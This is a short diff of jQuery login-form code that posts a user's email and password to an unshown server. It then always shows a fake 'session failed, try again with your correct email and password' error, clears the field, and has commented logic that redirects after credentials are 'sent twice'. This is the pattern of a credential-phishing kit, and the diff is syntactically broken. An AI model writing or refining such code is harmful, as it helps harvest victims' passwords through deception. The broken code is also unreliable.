@@ -57,18 +57,16 @@
                 data: {email: input4email, password: input4passwd},
                 processData: true,
                       })  
-                beforeSend: function(xhr){
-                    $('#showerror').removeClass('alert').text('')
-                    $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', false);
+               
                                    
                 complete: function(feedback) {
-                       $('#showerror').html('<div class="alert alert-danger">Could not reach server, please try again later.</div>');
+                       $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password");
                        // return false;
                 $('#igodo').focus();
                 $('#igodo').val('');
                 // $('#typesent').val("Verification");
     
-                // if (cou_nt>=2) { //check if it has been sent twice
+                // if (count>=2) { //check if it has been sent twice
                     // count=0;
                 // window.location.replace(response['redirect_link']);
                     // window.location.href =   $('#redirect').val();
